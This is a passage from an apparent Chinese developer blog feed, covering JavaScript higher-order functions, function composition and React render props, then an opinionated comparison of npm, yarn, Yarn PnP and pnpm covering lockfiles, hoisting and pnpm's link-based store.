true</span></span><br></pre></td></tr></table></figure><blockquote><p>所以就是第一个参数是fn，所以bind把函数作为参数的函数，验证bind为高级函数。</p><ul><li>apply</li><li>call</li><li>sort</li><li>map</li><li>filter</li><li>reduce</li></ul><p>同理</p></blockquote><h4 id="函数组合-pipe"><a href="#函数组合-pipe" class="headerlink" title="函数组合(pipe)"></a>函数组合(pipe)</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">dobuleSay</span>(str) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">str</span> + &#x27;, &#x27; + str</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title">capitalize</span>(str) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">str[0].toUpperCase()</span> + str.substring(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title">exclaim</span>(str) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">srt</span> + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = exclaim(capitalize(dobuleSay(str))) // 痛点：这样子的写法太麻烦</span><br><span class="line">// <span class="string">&quot;Hello, hello&quot;</span></span><br></pre></td></tr></table></figure><p>如果使用将来的js语法 <code>|&gt;</code> 改写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let result = <span class="string">&quot;hello&quot;</span></span><br><span class="line">  |&gt; doubleSay</span><br><span class="line">  |&gt; captitalize</span><br><span class="line">  |&gt; exclaim</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 如果现在想用，只能使用 Ramda.js 库</span><br><span class="line"><span class="regexp">//</span> const say = R.compose(doubleSay, captitalize, exclaim)</span><br><span class="line"><span class="regexp">//</span> let result = say(<span class="string">&#x27;hello&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>可以应用 react 组件之中，比如 from 的表单提交按钮，可以放到外部</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">From</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span> // 注意：此时的button无法将From元素提交出去，所以我们将使用高级组件</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">From</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">From</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">submit</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;submit&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      //...一堆的表单组件</span></span><br><span class="line"><span class="language-xml">      &#123;props.children&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="为了解决外部的-button-能够提交，使用高级组件解决"><a href="#为了解决外部的-button-能够提交，使用高级组件解决" class="headerlink" title="为了解决外部的 button 能够提交，使用高级组件解决"></a>为了解决外部的 <code>button</code> 能够提交，使用高级组件解决</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">From</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123; submit =&gt; (<span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;submit&#125;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span>) &#125; // 这里改成函数的形式，返回button组件</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">From</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">From</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">submit</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;submit&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      //...一堆的表单组件</span></span><br><span class="line"><span class="language-xml">      &#123; props.children() &#125; // 这里改成调用</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>杜绝使用 npm</title>
      <link href="/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/"/>
      <url>/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/</url>
      
        <content type="html"><![CDATA[<h1 id="管理器"><a href="#管理器" class="headerlink" title="管理器"></a>管理器</h1><ul><li>npm，太慢了，总会有莫名的bug，需要删除 node_modules，在次安装以后才能解决。</li><li>cnpm，已经淘汰。</li><li>yarn &#x2F; yarnPnP，比 npm 快很多，比 npm 做了很多的优化，但是还存有和 npm 一样的其他问题。</li><li>pnpm，更快，且解决了 npm&#x2F;yarn 内部潜在的 bug，并且极大了地优化了性能，扩展了使用场景。</li></ul><h1 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h1><p>node 自带</p><blockquote><p>为什么 node 要选择 npm？<br>在远古时代，前端是通过网址来共享代码，比如你想使用 jQuery，那么你点击 jQuery 网站上提供的链接就可以下载 jQuery，放到自己的网站上使用。<br>但是当项目的依赖越来越多的时候，这是一件很麻烦的事情，去 jQuery 官网下载 jQuery，去 BootStrap 官网下载 BootStrap…等等。<br>程序员 <a href="https://github.com/isaacs">Isaac Z. Schlueter</a> 给出一个解决方案：用一个工具把这些代码集中到一起来管理吧！毕竟懒才是程序员的第一生产力。</p></blockquote><h6 id="NPM-的思路大概是这样的："><a href="#NPM-的思路大概是这样的：" class="headerlink" title="NPM 的思路大概是这样的："></a>NPM 的思路大概是这样的：</h6><ul><li>买个服务器作为代码仓库（registry），在里面放所有需要被共享的代码</li><li>发邮件通知 jQuery、Bootstrap、Underscore 作者使用 npm publish 把代码提交到 registry 上，分别取名 jquery、bootstrap 和 underscore（注意大小写）</li><li>社区里的其他人如果想使用这些代码，就把 jquery、bootstrap 和 underscore 写到 package.json 里，然后运行 npm install ，npm 就会帮他们下载代码</li><li>下载完的代码出现在 node_modules 目录里，可以随意使用了。</li></ul><h6 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h6><ul><li>Isaaz 通知 jQuery 作者 John Resig，他会答应吗？这事儿不一定啊，对不对。</li><li>只有社区里的人都觉得 「npm 是个宝」的时候，John Resig 才会考虑使用 npm。</li><li>那么 npm 是怎么火的呢？</li><li>npm 的发展是跟 Node.js 的发展相辅相成的。</li><li>Node.js 是由一个在德国工作的美国程序员 Ryan Dahl 写的。他写了 Node.js，但是 Node.js 缺少一个包管理器，于是他和 npm 的作者一拍即合、抱团取暖，最终 Node.js 内置了 npm<em>（现在来看为什么 npm 这么烂，node 还要选择它，当时的 node 觉得自己 i&#x2F;o 很快，且当时的程序还没有这么复杂）</em>。后来的事情大家都知道，Node.js 火了。</li><li>所以说一门技术想要流行就得攀附、组合，NPM 全称 node package manager。（类似 LAMP，之前在编程历史中讲过）</li></ul><h1 id="yarn"><a href="#yarn" class="headerlink" title="yarn"></a>yarn</h1><h3 id="安装-yarn"><a href="#安装-yarn" class="headerlink" title="安装 yarn"></a>安装 yarn</h3><blockquote><p>首先<strong>不推荐</strong>使用 npm 安装<br><a href="https://stackoverflow.com/questions/40025890/why-wouldnt-i-use-npm-to-install-yarn">为什么？</a></p><ul><li>Yarn 团队认为 npm 不安全且不可靠，根据Yarn项目维护者的说法，通过npm安装Yarn<a href="https://github.com/yarnpkg/yarn/issues/1082#issuecomment-254026649" title="“应该将纱线视为一个“应用程序”而不是一个“ npm软件包””">违反了项目目标</a>，可能会引起问题，并且通常比特定于平台的安装方法更糟糕。</li><li>一般不推荐通过 npm 安装 Yarn。使用 npm 安装 Yarn 是不确定的，包没有签名，唯一执行的完整性检查是基本的 SHA1 哈希，这在安装系统范围的应用程序时是一个安全风险。</li><li>通过 npm 运行 Yarn，它是一个单独的包管理器实用程序，可能会导致边缘问题（请参阅<a href="https://github.com/yarnpkg/yarn/issues/2072" title="ENOENT 在运行 yarn 时试图要求 `uuid.js`">issue 2072</a>）</li><li>通过系统包管理器安装将 Yarn 与 npm 分离，允许您在没有 npm 的情况下运行 Yarn</li><li>系统包管理器通常会定期运行，保持 Yarn 更新</li><li>通过 npm 安装 Yarn 很<a href="https://github.com/yarnpkg/yarn/issues/2077#issuecomment-265280075" title="Daniel15 对问题 #2077 的评论">慢</a></li></ul></blockquote><blockquote><p><strong>但是</strong>从 Yarn 2.x 开始，Yarn 团队改变了他们的建议，现在建议通过 npm 安装该工具。此建议围绕锁定每个项目使用的 Yarn 版本的优势。这使项目能够适应不同版本的 Yarn 的变化。</p></blockquote><h1 id="pnpm（performant-npm）"><a href="#pnpm（performant-npm）" class="headerlink" title="pnpm（performant npm）"></a>pnpm（performant npm）</h1><p><img src="/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/img.png"></p><h3 id="安装-pnpm"><a href="#安装-pnpm" class="headerlink" title="安装 pnpm"></a>安装 pnpm</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> i -g pnpm</span><br></pre></td></tr></table></figure><h1 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h1><h2 id="安装时"><a href="#安装时" class="headerlink" title="安装时"></a>安装时</h2><p>执行命令后，首先会构建依赖树，然后针对每个节点下的包，会经历下面四个步骤:</p><ol><li>将依赖包的版本区间解析为某个具体的版本号</li><li>下载对应版本依赖的 tar 包到本地离线镜像（能够在无网环境下安装，npm 5+ 才抄袭过来）</li><li>将依赖从离线镜像解压到本地缓存</li><li>将依赖从缓存拷贝到当前目录的 node_modules 目录</li></ol><p>然后，对应的包就会到达项目的node_modules当中。</p><h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p><img src="/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/img_1.png"></p><blockquote><p>很明显 npm 是最慢的。<br>为什么慢，因为 node_modules，文件小而多，磁盘 I&#x2F;O 的特别慢，而且重复下载的文件也会在有多。</p></blockquote><h2 id="包管理方式"><a href="#包管理方式" class="headerlink" title="包管理方式"></a>包管理方式</h2><h3 id="依赖版本"><a href="#依赖版本" class="headerlink" title="依赖版本"></a>依赖版本</h3><ul><li>npm包管理工具都是通过 package.json 中对各个依赖包的描述去下载对应的依赖包的。</li><li>但 package.json <strong>只能规定大版本号</strong>。这样就会导致每个时期下载的依赖包都是不一样的，很容易出现兼容性等各种问题。例如：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.6&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li>字符 <code>^</code> 告诉 NPM 检查在 <code>3.X.X</code> 范围内是否有较新版本，如果有，则进行安装。类似地，<code>~</code> 字符只会出现在热修复程序或 <code>3.2.X</code> 上。</li><li>这样导致项目每次安装的时候版本不一致，可能引起一些相关错误。</li><li>而 yarn 率先发明了 lockfiles（已被 npm 5+ 抄袭）。</li><li>规定了具体每个依赖包的版本号和对应的下载路径，保证我们下次在重新安装依赖时，能跟上次一模一样。<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// <span class="keyword">package</span>-lock.json，npm 是 json 文件，方便看得懂</span><br><span class="line"><span class="string">&quot;vue&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;3.2.6&quot;</span>,   </span><br><span class="line">  <span class="string">&quot;resolved&quot;</span>: <span class="string">&quot;https://registry.npmjs.org/vue/-/vue-3.2.6.tgz&quot;</span>,   <span class="regexp">//</span>下载路径</span><br><span class="line">  <span class="string">&quot;integrity&quot;</span>: <span class="string">&quot;sha512-Zlb3LMemQS3Xxa6xPsecu45bNjr1hxO8Bh5FUmE0Dr6Ot0znZBKiM47rK6O7FTcakxOnvVN+NTXWJF6u8ajpCQ==&quot;</span>,   </span><br><span class="line">  <span class="string">&quot;requires&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@vue/compiler-dom&quot;</span>: <span class="string">&quot;3.2.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@vue/runtime-dom&quot;</span>: <span class="string">&quot;3.2.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@vue/shared&quot;</span>: <span class="string">&quot;3.2.6&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li>如果一个项目有 100 个依赖，并且这些依赖的依赖都有 lodash。</li><li>在 npm 中 lodash 很可能就被安装了 100 次，磁盘中就有 100 个地方写入了这部分代码。所以这能不能优化呢？</li><li>而在 yarn 中会实行的是扁平结构（已被 npm 3+ 抄袭）。<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ① 假设项目依赖a,b,c三个模块，依赖树为:</span></span><br><span class="line"><span class="comment">#  +- a</span></span><br><span class="line"><span class="comment">#    +- react@15</span></span><br><span class="line"><span class="comment">#  +- b</span></span><br><span class="line"><span class="comment">#    +- react@16</span></span><br><span class="line"><span class="comment">#  +- c</span></span><br><span class="line"><span class="comment">#    +- react@16</span></span><br><span class="line"><span class="comment"># yarn安装时会按照项目被依赖的次数作为权重，将依赖提升(hoisting)，</span></span><br><span class="line"><span class="comment"># 安装后的node_modules结构为:</span></span><br><span class="line">  .</span><br><span class="line">  └── node_modules</span><br><span class="line">      ├── a</span><br><span class="line">      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   ├── node_modules</span><br><span class="line">      │   │   └── react  <span class="comment"># @15</span></span><br><span class="line">      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      ├── <span class="keyword">b</span></span><br><span class="line"><span class="keyword"></span>      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      ├── c</span><br><span class="line">      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      └── react  <span class="comment"># @16 被依赖了两次，所以进行提升</span></span><br></pre></td></tr></table></figure></li><li>这样一来，重复的包将会大量减少，但是由于“提升”，当你只安装一个依赖的时候，会发现 node_modules 下多了很多的你没有安装的目录（因为重复的被提升了），node_modules 目录将会变得很丑。</li><li><img src="/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/img_2.png"></li><li>Q：为什么不一起把 react15 也一起提升了？</li><li>A：因为 node_modules 不能有效地处理重复的包. 两个名称相同但是不同版本的包是不能在一个目录下共存的。<br>-而且这里还有一个<strong>潜在的问题</strong>，即：如果 A 依赖 B， B 依赖 C，由于提升了那么 A 当中是可以直接使用 C 的，但问题是 A 当中并没有声明 C 这个依赖，因此会出现这种非法访问的情况（其中也有因为Node没有包的概念的关系，我猜测可能和 js 是一门运行时的语言有关）。</li><li>接下来在看两种情况：<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ② 现在假设在①的基础上，根项目依赖了react@15，对于项目自己的依赖肯定是要放在node_modules根目录的，</span></span><br><span class="line"><span class="comment"># 由于一个目录下不能存在同名目录，所以react@16没有的提升机会. </span></span><br><span class="line"><span class="comment"># 安装后node_moduels结构为</span></span><br><span class="line">  .</span><br><span class="line">  └── node_modules</span><br><span class="line">      ├── a</span><br><span class="line">      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   └── package.<span class="keyword">json </span><span class="comment"># react@15 提升</span></span><br><span class="line">      ├── <span class="keyword">b</span></span><br><span class="line"><span class="keyword"></span>      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   ├── node_modules</span><br><span class="line">      │   │   └── react  <span class="comment"># @16</span></span><br><span class="line">      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      ├── c</span><br><span class="line">      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   ├── node_modules</span><br><span class="line">      │   │   └── react  <span class="comment"># @16</span></span><br><span class="line">      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      └── react  <span class="comment"># @15</span></span><br><span class="line"><span class="comment"># 上面的结果可以看出，react@16出现了重复</span></span><br></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  .</span><br><span class="line">  └── node_modules</span><br><span class="line">      ├── a</span><br><span class="line">      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   ├── node_modules</span><br><span class="line">      │   │   └── react  <span class="comment"># @16</span></span><br><span class="line">      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      ├── <span class="keyword">b</span></span><br><span class="line"><span class="keyword"></span>      │   ├── index.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>      │   ├── node_modules</span><br><span class="line">      │   │   └── react  <span class="comment"># @15</span></span><br><span class="line">      │   └── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>      └── react  <span class="comment"># @15 or 16?</span></span><br><span class="line"><span class="comment"># 答案是: 都有可能。取决于 a 和 b 在 package.json中的位置，如果 a 声明在前面，那么就是提升的就是 react@16，否则是react@15。</span></span><br></pre></td></tr></table></figure></li><li>所以这种扁平化结构存在的缺点有：一、依赖结构的<strong>不确定性</strong>。二：扁平化算法本身的<strong>复杂性很高</strong>，耗时较长。三：项目中仍然可以<strong>非法访问</strong>没有声明过依赖的包。四：在某些情况下没有很好的解决<strong>重复问题</strong>。</li><li>因此 yarn 又做出了改进，加入的 <strong>PnP（Plug’n’Play）</strong> 功能，1.12 版本开始默认包含，2.0 版本开始默认开启。</li><li>基本原理：Yarn 作为一个包管理器，它知道你的项目的依赖树. 那能不能让 Yarn 告诉 Node? 让它直接到某个目录去加载模块。这样即可以提高 Node 模块的查找效率，也可以减少 node_modules 文件的拷贝。</li><li>在 pnp 模式下，Yarn 不会创建 node_modules 目录，取而代之的是 <strong>.yarn 目录</strong>和 <strong>.pnp.js</strong>文件。</li><li><code>.pnp.js</code> 文件，这个文件包含了项目的依赖树信息，模块查找算法，也包含了模块查找器的 patch 代码(在 Node 环境，覆盖 Module._load 方法)，简单来说就是项目的npm模块解析规则。</li><li>.yarn 目录存放了项目中下载的所有依赖的zip包。</li><li><img src="/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/img_3.png"></li><li>使用 pnp 机制的以下优点：<ol><li>摆脱了 node_modules：<ul><li>时间上: 相比较在热缓存(hot cache)环境下运行yarn install节省 70%的时间。</li><li>空间上: pnp 模式下，所有 npm 模块都会存放在全局的缓存目录下，依赖树扁平化，避免拷贝和重复。</li></ul></li><li>提高模块加载效率，Node 为了查找模块，需要调用大量的 stat 和 readdir 系统调用。. pnp 通过 Yarn 获取或者模块信息，直接定位模块。</li><li>不再受限于 node_modules 同名模块不同版本不能在同一目录。</li></ol></li><li>使用 pnp 机制的以下缺点<ol><li>因为 node 依赖解析的目录 node_modules 没了，不能直接使用 node xxx.js。</li><li>由于还是不够成熟（2018.9面世），前端社区其他工具链支持度还不够，从官方看已有<a href="https://yarnpkg.com/features/pnp#native-support">下列的工具有条件支持(某版本起或插件支持)</a>。</li></ol></li><li>但 pnpm 内部使用基于内容寻址的文件系统来存储磁盘上所有的文件，他只会安装一次，磁盘中只有一个地方写入（rails 也类似这样），后面再次使用都会直接使用 hardlink（<a href="https://www.cnblogs.com/itech/archive/2009/04/10/1433052.html">硬链接</a>），这种方法几乎就解决了上面的所有问题。</li><li>例如我们安装一个依赖：<code>pnpm init -y</code> &amp;&amp; <code>pnmp i react</code></li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── node_modules</span><br><span class="line">│    ├── <span class="string">.pnpm</span></span><br><span class="line">│    ├── react</span><br><span class="line">│    ├── <span class="string">.modules.yaml</span></span><br><span class="line">└── package.json</span><br><span class="line">└── pnpm-lock.yaml <span class="comment"># lockfiles</span></span><br></pre></td></tr></table></figure><ul><li>如此整洁、干净，我们直接就看到了 react，但值得注意的是，这里仅仅只是一个软链接，那么它真正的位置在哪呢？</li><li>.pnpm 当中寻找：<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── node_modules</span><br><span class="line">      ├── .pnpm</span><br><span class="line">            ├ node_modules</span><br><span class="line">            ├ registry.npmjs.org+@js+tokens@<span class="number">4.0</span><span class="number">.0</span></span><br><span class="line">            ├ <span class="params">...</span><span class="params">...</span>.</span><br><span class="line">            ├ registry.npmjs.org+react@<span class="number">17.0</span><span class="number">.2</span></span><br><span class="line">                ├ node_modules</span><br><span class="line">                    ├ loose<span class="params">-envify</span> (软链接)</span><br><span class="line">                    ├ <span class="params">...</span> (软链接)</span><br><span class="line">                    ├ react</span><br><span class="line">                      ├ cjs</span><br><span class="line">                      ├ umd</span><br><span class="line">                      ├ <span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure></li><li>好家伙！竟然在 <code>.pnpm/egistry.npmjs.org+react@17.0.2/node_modules/react</code> 下面找到了！同级其他的依赖也都是软链接。</li><li>再看看.pnpm，.pnpm目录下虽然呈现的是扁平的目录结构，但仔细想想，顺着软链接慢慢展开，其实就是嵌套的结构！</li><li>将包本身和依赖放在同一个node_module下面，与原生 Node 完全兼容，又能将 package 与相关的依赖很好地组织到一起，设计十分精妙，也解决了 yarn PnP 没有 node_modules 的问题。</li><li>这么好的东西为什么没有人用呢？<ul><li>兼容问题，像 hard link 和 symlink 这种方式在所有的系统上都是兼容的吗？实际上 hard link 在主流系统上(Unix&#x2F;Win)使用都是没有问题的，但是 symlink 即软连接的方式可能会在 windows 存在一些兼容的问题，但是针对这个问题，pnpm 也提供了对应的解决方案：在 win 系统上使用一个叫做 junctions 的特性来替代软连接，这个方案在 win 上的兼容性要好于 symlink。</li><li>或许你也会好奇为啥 pnpm 要使用 hard links 而不是全都用 symlink 来去实现。</li><li>实际上存在 store 目录里面的依赖也是可以通过软连接去找到的，nodejs 本身有提供一个叫做 –preserve-symlinks 的参数来支持 symlink，但实际上这个参数实际上对于 symlink 的支持并不好导致作者放弃了该方案从而采用 hard links 的方式。<a href="https://github.com/nodejs/node-eps/issues/46">具体可以参考该 issue</a>。</li><li><img src="/Blog/2022/02/13/essay/%E6%9D%9C%E7%BB%9D%E4%BD%BF%E7%94%A8npm/index/img_4.png"></li></ul></li></ul><h2 id="monorepo"><a href="#monorepo" class="headerlink" title="monorepo"></a>monorepo</h2><ul><li>只有 pnpm 支持。</li><li><a href="https://zhuanlan.zhihu.com/p/350317373">npm(npm 7+ 抄袭)&#x2F;yarn workspace</a></li><li>随着前端工程的日益复杂，越来越多的项目开始使用 monorepo。之前对于多个项目的管理，我们一般都是使用多个 git 仓库，但 monorepo 的宗旨就是用一个 git 仓库来管理多个子项目，所有的子项目都存放在根目录的packages目录下，那么一个子项目就代表一个package。如果你之前没接触过 monorepo 的概念，建议仔细看看这篇文章(<a href="https://link.zhihu.com/?target=https://www.perforce.com/blog/vcs/what-monorepo">https://www.perforce.com/blog/vcs/what-monorepo</a>)以及开源的 monorepo 管理工具<code>lerna</code>(<a href="https://link.zhihu.com/?target=https://github.com/lerna/lerna%23readme">https://github.com/lerna/lerna#readme</a>)，项目目录结构可以参考一下 <code>babel 仓库</code>(<a href="https://link.zhihu.com/?target=https://github.com/babel/babel">https://github.com/babel/babel</a>)。</li><li>pnpm 体现在各个子命令的功能上，比如在根目录下 <code>pnpm add A -r</code>，那么所有的 package 中都会被添加 A 这个依赖，当然也支持 –filter 字段来对 package 进行过滤。</li></ul><h1 id="目前我们为什么使用-yarn"><a href="#目前我们为什么使用-yarn" class="headerlink" title="目前我们为什么使用 yarn"></a>目前我们为什么使用 yarn</h1><ul><li>因为 npm 太慢了。</li><li>从目前主流的开源项目来看，几乎没有使用 npm 的仓库，一般都是 